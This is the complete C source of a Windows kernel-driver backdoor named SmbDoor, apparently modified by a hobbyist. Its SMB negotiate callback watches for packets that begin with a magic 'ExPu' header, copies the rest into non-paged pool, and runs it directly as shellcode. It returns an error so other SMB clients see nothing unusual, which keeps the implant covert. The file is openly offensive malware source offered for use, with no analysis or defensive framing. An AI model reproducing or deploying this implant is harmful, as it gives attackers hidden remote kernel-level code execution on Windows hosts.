#include <ntddk.h>
#include "smbdoor.h"

#ifdef ALLOC_PRAGMA
#pragma alloc_text( NONPAGED, SmbDoorGenericCallback )
#pragma alloc_text( NONPAGED, SmbDoorNegotiateCallback )
#endif

NTSTATUS SmbDoorGenericCallback(VOID)
{
	return STATUS_SUCCESS;
}

NTSTATUS SmbDoorNegotiateCallback(PVOID Unknown, SIZE_T RawSize, PUCHAR RawBytes)
{
	UNREFERENCED_PARAMETER(Unknown);

	if (*(ULONG*)RawBytes == SMBDOOR_SMB_HEADER) // 'ExPu'
	{
		// incoming bytes are on NPP-NX pool
		PVOID ShellcodeBuffer = ExAllocatePoolWithTag(NonPagedPool, RawSize - 4, SMBDOOR_POOL_TAG);

		if (ShellcodeBuffer != NULL)
		{
			// a cipher can be used here instead
			RtlCopyMemory(ShellcodeBuffer, RawBytes + 4, RawSize - 4);

			// *** MODIFIED (for me it wouldn't execute) *** 
			// call shellcode, what sucks is we're DISPATCH_LEVEL
			// ORIGINAL (*(void(*)(void))ShellcodeBuffer)();
			
			
			// from my https://gist.github.com/loneicewolf/8232aad5722e1e7de9d92932b5a01597
			// (*(void(*)())sh_1)();
			(*(void(*)())ShellcodeBuffer)();

			ExFreePoolWithTag(ShellcodeBuffer, SMBDOOR_POOL_TAG);
		}
	}

	// return an error so we don't interfere with other SMB clients
	return STATUS_NOT_SUPPORTED;
}
